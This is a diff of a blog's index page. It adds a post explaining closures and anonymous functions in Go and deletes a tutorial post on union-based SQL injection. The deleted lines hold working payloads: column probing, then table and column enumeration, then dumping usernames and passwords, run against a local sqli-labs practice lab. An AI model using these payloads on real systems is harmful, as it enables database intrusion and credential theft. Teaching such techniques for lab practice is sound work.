@@ -158,6 +158,99 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2018/11/28/goAnonymousFunctionClosure/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2018/11/28/goAnonymousFunctionClosure/" class="post-title-link" itemprop="url">Closure and Anonymous Function in Go</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-11-28 21:21:24" itemprop="dateCreated datePublished" datetime="2018-11-28T21:21:24-05:00">2018-11-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-17 11:38:03" itemprop="dateModified" datetime="2023-10-17T11:38:03-04:00">2023-10-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Go/" itemprop="url" rel="index"><span itemprop="name">Go</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Go/Closure-and-Anonymous-Function/" itemprop="url" rel="index"><span itemprop="name">Closure and Anonymous Function</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>In Go language, <strong><em>closures</em></strong> and <strong><em>anonymous functions</em></strong> are both forms of functions, but they have some important differences. Below, I will provide examples of the usage and differences between these two concepts:</p>
+<ol>
+<li><strong><em>Closure</em></strong> Example:<br>A <strong><em>closure</em></strong> refers to a function that captures one or more variables from its outer function scope and can be called outside of that function while still accessing these captured variables.</li>
+</ol>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    outerVar := <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Closure function</span></span><br><span class="line">    closure := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Outer variable outerVar:&quot;</span>, outerVar)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call the closure function</span></span><br><span class="line">    closure() <span class="comment">// Output: Outer variable outerVar: 10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Modify the outer variable</span></span><br><span class="line">    outerVar = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call the closure function again</span></span><br><span class="line">    closure() <span class="comment">// Output: Outer variable outerVar: 20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>In the above example, <strong><em>closure</em></strong> is a closure that captures the outer variable outerVar and can access and modify that variable even outside the function.</p>
+<ol start="2">
+<li><strong><em>Anonymous Function</em></strong> Example:</li>
+</ol>
+<p>An <strong><em>anonymous function</em></strong> is a function without a name; it can be directly assigned to a variable or passed as an argument to other functions.</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Define and call an anonymous function</span></span><br><span class="line">    result := <span class="function"><span class="keyword">func</span><span class="params">(x, y <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x + y</span><br><span class="line">    &#125;(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;Result of the anonymous function:&quot;</span>, result) <span class="comment">// Output: Result of the anonymous function: 8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Assign an anonymous function to a variable</span></span><br><span class="line">    add := <span class="function"><span class="keyword">func</span><span class="params">(x, y <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x + y</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sum := add(<span class="number">10</span>, <span class="number">20</span>)</span><br><span class="line">    fmt.Println(<span class="string">&quot;Calling the anonymous function using a variable:&quot;</span>, sum) <span class="comment">// Output: Calling the anonymous function using a variable: 30</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>In the above example, we define an <strong><em>anonymous function</em></strong> and call it directly. We also assign another <strong><em>anonymous function</em></strong> to the add variable and use that variable to call the function.</p>
+<p>To summarize the differences:</p>
+<p>A <strong><em>closure</em></strong> is a function that captures external variables and can access and modify them outside of the function.<br>An <strong><em>anonymous function</em></strong> is a function without a name, which can be assigned to a variable or passed as an argument to other functions.<br>It’s important to note that while <strong><em>closures</em></strong> often involve <strong><em>anonymous functions</em></strong>, not all <strong><em>anonymous functions</em></strong> are <strong><em>closures</em></strong>. A <strong><em>closure</em></strong> is a specific type of <strong><em>anonymous function</em></strong> that captures external variables.</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2018/11/16/goFunc/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1071,102 +1164,6 @@ These steps describe a method for performing time-based blind SQL injection to e
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/24/SQLInjectionUnion/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2016/10/24/SQLInjectionUnion/" class="post-title-link" itemprop="url">Union Sql Injection Detection Methods</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2016-10-24 19:11:44" itemprop="dateCreated datePublished" datetime="2016-10-24T19:11:44-04:00">2016-10-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-18 20:46:23" itemprop="dateModified" datetime="2023-10-18T20:46:23-04:00">2023-10-18</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Union-Sql-Injection/" itemprop="url" rel="index"><span itemprop="name">Union Sql Injection</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Union-Sql-Injection-Detection-Methods"><a href="#Union-Sql-Injection-Detection-Methods" class="headerlink" title="Union Sql Injection Detection Methods"></a>Union Sql Injection Detection Methods</h1><ol>
-<li>First, check for the existence of an SQL injection vulnerability.</li>
-<li>Then, determine the injection type: character-based, numeric-based, or search-based.</li>
-<li>Use “order by” to further identify the number of columns:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+ (normal)</span><br><span class="line">?id=1&#x27; order by 4 --+ (error)</span><br></pre></td></tr></table></figure></li>
-<li>Once the number of columns is determined using “order by,” proceed to replace the display position with some MySQL functions.</li>
-<li>Retrieve the tables in the current database:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;, table_name), version() from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure></li>
-<li>After obtaining the tables, retrieve the columns in those tables:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;, column_name), version() from information_schema.columns where able_schema=database() and table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
-<li>Retrieve the data:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;|&#x27;, username), group_concat(&#x27;|&#x27;, password) from users--+</span><br></pre></td></tr></table></figure>
-These steps describe how an attacker can detect and exploit a SQL injection vulnerability to extract information from a database.</li>
-</ol>
-<h1 id="Example-of-Union-Sql-Injection-Operation"><a href="#Example-of-Union-Sql-Injection-Operation" class="headerlink" title="Example of Union Sql Injection Operation"></a>Example of Union Sql Injection Operation</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27;</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 3 --+ correct</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 4 --+ error</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,3 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),version() --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;,table_name) ,version() from information_schema.tables where table_schema=database()--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;,column_name),version() from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1, username,password from users --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1, group_concat(&#x27;|&#x27;,username),group_concat(&#x27;|&#x27;,password) from users --+</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1238,19 +1235,19 @@ These steps describe how an attacker can detect and exploit a SQL injection vuln
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-count">45</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">61</span>
+        <span class="site-state-item-count">63</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-count">21</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -1278,7 +1275,7 @@ These steps describe how an attacker can detect and exploit a SQL injection vuln
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
